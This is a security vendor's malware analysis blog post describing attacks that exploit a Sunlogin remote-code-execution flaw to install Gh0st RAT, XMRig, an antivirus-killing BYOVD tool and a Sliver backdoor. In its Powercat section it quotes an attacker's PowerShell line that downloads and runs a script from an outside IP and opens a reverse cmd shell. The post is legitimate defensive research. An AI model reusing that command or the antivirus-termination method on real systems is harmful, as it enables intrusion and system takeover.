							Sliver Malware With BYOVD Distributed Through Sunlogin Vulnerability Exploitations						</h1>

					<!-- Article content -->
					<div class="entry-content clearfix">
						
						
<p>Sliver is an open-source penetration testing tool developed in the Go programming language. Cobalt Strike and Metasploit are major examples of penetration testing tools used by many threat actors, and various attack cases involving these tools have been covered here on the ASEC blog. Recently, there have been cases of threat actors using Sliver in addition to Cobalt Strike and Metasploit.</p>



<p>The ASEC (AhnLab Security Emergency response Center) analysis team is monitoring attacks against systems with either unpatched vulnerabilities or misconfigured settings. During this process, we have recently discovered a Sliver backdoor being installed through what is presumed to be vulnerability exploitation on certain software. Not only did threat actors use the Sliver backdoor, but they also used the BYOVD (Bring Your Own Vulnerable Driver) malware to incapacitate security products and install reverse shells.</p>



<p>The software that was targeted by this vulnerability exploitation was Sunlogin, a remote-control program developed in China. Sunlogin, which had its remote code execution vulnerability (CNVD-2022-10270 / CNVD-2022-03672) and the code that exploited said vulnerability made publicly available last year, is still being targeted by vulnerability attacks.</p>



<p>First, a brief summary of the Sliver penetration testing tool will be given. Afterward, cases involving the continuous Sunlogin attacks will be covered through our ASD (AhnLab Smart Defense) logs. Finally, we will break down the recently confirmed attack cases where Sliver and BYOVD were ultimately installed.</p>



<h3 class="wp-block-heading">1. Sliver</h3>



<p>Penetration testing tools are used for the purpose of checking the security vulnerabilities within the network and systems of companies and institutes. They can potentially be used for malicious purposes if placed in the hands of threat actors as they generally provide various features for each penetration testing stage.</p>



<p>The most well-known commercial penetration testing tool would most likely be Cobalt Strike. Following the release of its cracked version, it is still being used by various threat actors to this very day. There is also the tool developed in open-source, Metasploit, which is similarly easy to obtain and thus often used in attacks. There are many other penetration testing tools aside from Cobalt Strike and Metasploit, but a majority of recent cases were found to be using the open-source penetration testing tool, Sliver.&nbsp;<a href="https://github.com/BishopFox/sliver" target="_blank" rel="noreferrer noopener"><strong>[1]</strong></a></p>


<div class="wp-block-image">
<figure class="aligncenter"><img fetchpriority="high" decoding="async" width="869" height="773" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2023/01/image-65.png?resize=869%2C773&amp;ssl=1" alt="" class="wp-image-46216" srcset="https://asec.ahnlab.com/wp-content/uploads/2023/01/image-65.png 869w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-65-600x534.png 600w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-65-300x267.png 300w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-65-768x683.png 768w" sizes="(max-width: 869px) 100vw, 869px" /><figcaption class="wp-element-caption">Figure 1. Sliver description</figcaption></figure></div>


<p>Among the characteristics of Sliver, the fact that it was developed using Go, a cross platform-supporting language, allows it to support Windows, Linux, and macOS. Its comparatively recent development could also be considered a defining characteristic, but this is because the tools that have been consistently used by threat actors since the past, like Cobalt Strike and Metasploit, are more prone to being detected by security products compared to Sliver. Therefore, Sliver is being used by various threat actors in place of existing tools like Cobalt Strike.&nbsp;<a href="https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors" target="_blank" rel="noreferrer noopener"><strong>[2]</strong></a>&nbsp;<a href="https://www.microsoft.com/en-us/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/" target="_blank" rel="noreferrer noopener"><strong>[3]</strong></a>&nbsp;<a href="https://www.proofpoint.com/us/blog/security-briefs/ta551-uses-sliver-red-team-tool-new-activity" target="_blank" rel="noreferrer noopener"><strong>[4]</strong></a></p>



<p>Commands can be sent by the threat actor through the backdoor created by Sliver to perform a variety of malicious behaviors. Its features include most of the features supported by typical backdoors and RAT malware, such as process and file handling, command execution, uploading/downloading files, and screenshot capturing. It also provides other features necessary for overtaking internal networks, such as privilege escalation, process memory dumping, and lateral movement.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" width="947" height="549" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2023/01/image-66.png?resize=947%2C549&amp;ssl=1" alt="" class="wp-image-46218" srcset="https://asec.ahnlab.com/wp-content/uploads/2023/01/image-66.png 947w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-66-600x348.png 600w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-66-300x174.png 300w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-66-768x445.png 768w" sizes="(max-width: 947px) 100vw, 947px" /><figcaption class="wp-element-caption">Figure 2. Command transmission process to the installed Sliver backdoor</figcaption></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" width="872" height="752" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2023/01/image-67.png?resize=872%2C752&amp;ssl=1" alt="" class="wp-image-46219" srcset="https://asec.ahnlab.com/wp-content/uploads/2023/01/image-67.png 872w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-67-600x517.png 600w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-67-300x259.png 300w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-67-768x662.png 768w" sizes="(max-width: 872px) 100vw, 872px" /><figcaption class="wp-element-caption">Figure 3. A portion of the commands supported by Sliver</figcaption></figure></div>


<p>In addition to file, behavior, and memory detection, anti-malware security products are also capable of detecting network behaviors like when a malware strain tries to communicate with C&amp;C servers. Therefore, various penetration testing tools, including Cobalt Strike, provide multiple ways to bypass communicating with the C&amp;C server in order to evade network detection. Sliver also supports methods that use mTLS, WireGuard, HTTP(S), and DNS to communicate with the C&amp;C server, which allows it to evade the network detection of security products through the encryption of network communication.</p>



<p>Session Mode and Beacon Mode are the two modes also supported by the Sliver backdoor. Sliver that has been built in Session Mode communicates with the C&amp;C server in real-time while the Sliver built in Beacon Mode communicates with the C&amp;C server asynchronously. The latter obtains commands or task lists from the C&amp;C server and sends the results after executing them.</p>



<h3 class="wp-block-heading">2. Vulnerability Exploitations and Attacks Targeting Sunlogin</h3>



<p>Sunlogin is a remote-control utility developed by the Chinese tech company, Oray. In 2022, the remote code execution vulnerability, CNVD-2022-10270 / CNVD-2022-03672, was made publicly available along with the code that exploited it,&nbsp;<a href="https://mdnice.com/writing/8a41e22d1d0744bd9e8ab5999d3cfebe" target="_blank" rel="noreferrer noopener"><strong>[5]</strong></a>&nbsp;after which attacks that abused these were found. We assume that “SunloginCLient.exe” is the vulnerable process that is being targeted by attacks,&nbsp;<a href="https://wiki.y1ng.org/0x2_%20威胁狩猎/2x3_初始访问/T1190-CNVD-2022-03672-向日葵RCE漏洞/" target="_blank" rel="noreferrer noopener"><strong>[6]</strong></a>&nbsp;and multiple attacks have been confirmed since early 2022 according to our ASD logs.</p>



<h4 class="wp-block-heading">2.1. Gh0st RAT</h4>



<p>Although the packet used in the attack has not been found, it is assumed that the malware are installed through the Sunlogin RCE vulnerability exploitation following the PowerShell command ran on the “SunloginCLient.exe” process. The “SunloginCLient.exe” process used in the actual attacks is an earlier version than v11.0.0.33, which is known to have been patched. The following is the process tree of the PowerShell command that downloads and installs Gh0st RAT. It is through this that we can confirm that the PowerShell command was run by the “SunloginCLient.exe” process.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img loading="lazy" decoding="async" width="1021" height="437" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2023/01/image-68.png?resize=1021%2C437&amp;ssl=1" alt="" class="wp-image-46222" srcset="https://asec.ahnlab.com/wp-content/uploads/2023/01/image-68.png 1021w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-68-600x257.png 600w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-68-300x128.png 300w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-68-768x329.png 768w" sizes="(max-width: 1021px) 100vw, 1021px" /><figcaption class="wp-element-caption">Figure 4. Gh0st RAT installation process tree</figcaption></figure></div>


<p>Aside from this, an assumption can also be inferred by examining the command used in the attacks. <h4 class="wp-block-heading">2.2. XMRig CoinMiner</h4>



<p>Threat actors occasionally install XMRig CoinMiner instead of Gh0stRAT. According to our ASD log, the following command is executed via the “SunloginCLient.exe” process which downloads and runs “syse.bat”, the batch malware.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img loading="lazy" decoding="async" width="1223" height="287" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2023/01/image-83.png?resize=1024%2C240&amp;ssl=1" alt="" class="wp-image-46261" srcset="https://asec.ahnlab.com/wp-content/uploads/2023/01/image-83.png 1223w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-83-600x141.png 600w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-83-300x70.png 300w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-83-1024x240.png 1024w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-83-768x180.png 768w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-83-1200x282.png 1200w" sizes="(max-width: 1223px) 100vw, 1223px" /><figcaption class="wp-element-caption">Figure 7. Vulnerability exploitation command that installs XMRig CoinMiner</figcaption></figure></div>


<p>“syse.bat” downloads either the “t.zip” or “t_64.zip” compressed file alongside 7z according to the hardware environment. The files are then unzipped in either the “C:\windows\WinSysMaintenance\.arc ” or “C:\WinSysMaintenance\.arc ” directories depending on the privilege.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img loading="lazy" decoding="async" width="925" height="476" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2023/01/image-72.png?resize=925%2C476&amp;ssl=1" alt="" class="wp-image-46228" srcset="https://asec.ahnlab.com/wp-content/uploads/2023/01/image-72.png 925w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-72-600x309.png 600w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-72-300x154.png 300w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-72-768x395.png 768w" sizes="(max-width: 925px) 100vw, 925px" /><figcaption class="wp-element-caption">Figure 8. Download routine for the compressed file containing malware</figcaption></figure></div>


<p>Instead of XMRig CoinMiner being contained as-is within the compressed file, it is executed through the launcher and loader malware. “watch.exe” is the launcher and “splwow32.exe” is the loader malware that loads and decodes the encoded XMRig, “WINSysCoreR.bin”, before executing it in the memory.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img loading="lazy" decoding="async" width="698" height="136" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2023/01/image-73.png?resize=698%2C136&amp;ssl=1" alt="" class="wp-image-46229" srcset="https://asec.ahnlab.com/wp-content/uploads/2023/01/image-73.png 698w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-73-600x117.png 600w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-73-300x58.png 300w" sizes="(max-width: 698px) 100vw, 698px" /><figcaption class="wp-element-caption">Figure 9. Compressed file containing malware</figcaption></figure></div>


<p>Afterward, “syse.bat” changes the XMRig wallet address and transfers “WINSysCoreR.bin” as an argument of “splwow32.exe” before executing it. This starts the Monero coin mining process in the infected system.</p>

<h3 class="wp-block-heading">3. Cases of Recent Attacks</h3>



<p>There have been a steady number of attacks targeting the Sunlogin RCE vulnerability. Most of these cases involved the installation of Gh0st RAT and XMRig CoinMiner. In this blog post, we will be covering the recently confirmed attacks where a Sliver backdoor and Powercat reverse shell were installed.</p>



<p>The threat actor first installed a PowerShell script using the Sunlogin RCE vulnerability. This PowerShell script functioned by using the BYOVD technique to incapacitate security products installed in the system before installing a reverse shell using Powercat. It is unconfirmed whether it was done by the same threat actor, but after a few hours, a log shows that a Sliver backdoor was installed on the same system through a Sunlogin RCE vulnerability exploitation.</p>



<h4 class="wp-block-heading">3.1. BYOVD &amp; Powercat</h4>



<p>The first command executed on the target system is a command that downloads and executes the following “2.ps1” PowerShell script.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img loading="lazy" decoding="async" width="790" height="178" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2023/01/image-75.png?resize=790%2C178&amp;ssl=1" alt="" class="wp-image-46233" srcset="https://asec.ahnlab.com/wp-content/uploads/2023/01/image-75.png 790w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-75-600x135.png 600w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-75-300x68.png 300w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-75-768x173.png 768w" sizes="(max-width: 790px) 100vw, 790px" /><figcaption class="wp-element-caption">Figure 11. PowerShell command that installs the loader malware</figcaption></figure></div>


<p>The PowerShell script is obfuscated, but upon closer examination, we can see that it has a simple structure with the following two major features. The first feature decodes the compressed .NET PE before loading and executing it in the memory. The encoded PE is developed in .NET, and the function kdjvasbulidcfaeusyefoaexwyroaw7fyoaeufhodusicvfy8cye() is executed through a PowerShell command.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img loading="lazy" decoding="async" width="724" height="270" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2023/01/image-76.png?resize=724%2C270&amp;ssl=1" alt="" class="wp-image-46234" srcset="https://asec.ahnlab.com/wp-content/uploads/2023/01/image-76.png 724w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-76-600x224.png 600w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-76-300x112.png 300w" sizes="(max-width: 724px) 100vw, 724px" /><figcaption class="wp-element-caption">Figure 12. Decoded PowerShell command – Modified</figcaption></figure></div>


<p>“ujacldfajlvjfaslflcevdfuaelfiua.exe” is assumed to be the open-source tool Mhyprot2DrvControl that was personally modified by the threat actor to forcefully terminate security products.&nbsp;<a href="https://github.com/kagurazakasanae/Mhyprot2DrvControl" target="_blank" rel="noreferrer noopener"><strong>[8]</strong></a>&nbsp;Unlike the open-source tool, the malware has the following AvList which contains the process names of anti-malware products to be forcefully terminated.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img loading="lazy" decoding="async" width="849" height="581" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2023/01/image-77.png?resize=849%2C581&amp;ssl=1" alt="" class="wp-image-46235" srcset="https://asec.ahnlab.com/wp-content/uploads/2023/01/image-77.png 849w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-77-600x411.png 600w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-77-300x205.png 300w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-77-768x526.png 768w" sizes="(max-width: 849px) 100vw, 849px" /><figcaption class="wp-element-caption">Figure 13. List of anti-malware products to be force terminated</figcaption></figure></div>


<p>Mhyprot2DrvControl uses the BYOVD (Bring Your Own Vulnerable Driver) technique, which abuses vulnerable Windows driver files and uses the escalated privilege to perform arbitrary behaviors. Recently, many threat actors have been using this technique to escalate their privileges and forcefully terminate security products to evade detection.&nbsp;<a href="https://www.trendmicro.com/en_us/research/22/h/ransomware-actor-abuses-genshin-impact-anti-cheat-driver-to-kill-antivirus.html" target="_blank" rel="noreferrer noopener"><strong>[9]</strong></a></p>



<p>Mhyprot2DrvControl specifically abuses the mhyprot2.sys file. This file is an anti-cheat driver developed by the Chinese game company miHoYo, the creators of Genshin Impact. mhyprot2.sys is a normal, authenticated driver file with a valid signature, but the process that calls this file has vulnerable verification conditions. Through a simple bypassing process, the malware can access the kernel area through mhyprot2.sys. The developer of Mhyprot2DrvControl provided multiple features that can be utilized with the privileges escalated through mhyprot2.sys. Among these, the threat actor used the feature which allows the force termination of processes to develop a malware that shuts down multiple anti-malware products.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img loading="lazy" decoding="async" width="1066" height="526" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2023/01/image-78.png?resize=1024%2C505&amp;ssl=1" alt="" class="wp-image-46237" srcset="https://asec.ahnlab.com/wp-content/uploads/2023/01/image-78.png 1066w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-78-600x296.png 600w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-78-300x148.png 300w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-78-1024x505.png 1024w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-78-768x379.png 768w" sizes="(max-width: 1066px) 100vw, 1066px" /><figcaption class="wp-element-caption">Figure 14. Routine for checking the process list to terminate AV products</figcaption></figure></div>


<p>The second feature of the PowerShell script is downloading Powercat from an external source and using it to run the reverse shell in the infected system. When executed, the reverse shell connects to the C&amp;C server and provides the threat actor control over the infected system by providing the cmd.exe, in other words, the shell.</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>IEX (New-Object Net.Webclient).DownloadString(“hxxp://45.144.3[.)216/powercat.ps1”);<br />powercat -c 45.144.3.216 -p 14356 -e cmd</p>
</blockquote>



<h4 class="wp-block-heading">3.2. Sliver Backdoor Attack</h4>

<div class="wp-block-image">
<figure class="aligncenter"><img loading="lazy" decoding="async" width="968" height="165" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2023/01/image-80.png?resize=968%2C165&amp;ssl=1" alt="" class="wp-image-46240" srcset="https://asec.ahnlab.com/wp-content/uploads/2023/01/image-80.png 968w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-80-600x102.png 600w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-80-300x51.png 300w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-80-768x131.png 768w" sizes="(max-width: 968px) 100vw, 968px" /><figcaption class="wp-element-caption">Figure 16. <p>The downloaded “acl.exe” is the Sliver backdoor. Sliver is normally obfuscated when the backdoor is built. Thus, only the obfuscated Go functions can be seen even after decompiling. This means that the threat actor used the binaries generated by the Sliver framework in the attacks as-is without additional packing processes.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img loading="lazy" decoding="async" width="767" height="264" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2023/01/image-81.png?resize=767%2C264&amp;ssl=1" alt="" class="wp-image-46241" srcset="https://asec.ahnlab.com/wp-content/uploads/2023/01/image-81.png 767w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-81-600x207.png 600w, https://asec.ahnlab.com/wp-content/uploads/2023/01/image-81-300x103.png 300w" sizes="(max-width: 767px) 100vw, 767px" /><figcaption class="wp-element-caption">Figure 17. Obfuscated Sliver backdoor</figcaption></figure></div>


<p>Since the function name is obfuscated but the practical routine remains the same, static analysis shows that Sliver utilized in the attack was built in Session Mode and used the mTLS protocol for communication with the C&amp;C server. Additionally, the team found the configuration data that was decoded together with the Sliver backdoor&#8217;s name and C&amp;C server address through the debugging process as shown in Figure 18.</p>

<h3 class="wp-block-heading">4. Conclusion</h3>



<p>Recently, the team has confirmed cases of attack where various strains of malware, including the Sliver backdoor, were installed on vulnerable and unpatched software. Sliver is being used in various forms of attack by recent attack groups that steal information from company systems and install ransomware on them. This is because, as a penetration testing tool, Sliver offers the required step-by-step features like account information theft, internal network movement, and overtaking the internal network of companies, just like Cobalt Strike.</p>



<p>Users should apply the latest patch to their installed software to prevent vulnerability exploitations in advance. Also, V3 should be updated to the latest version so that malware infection can be prevented.</p>
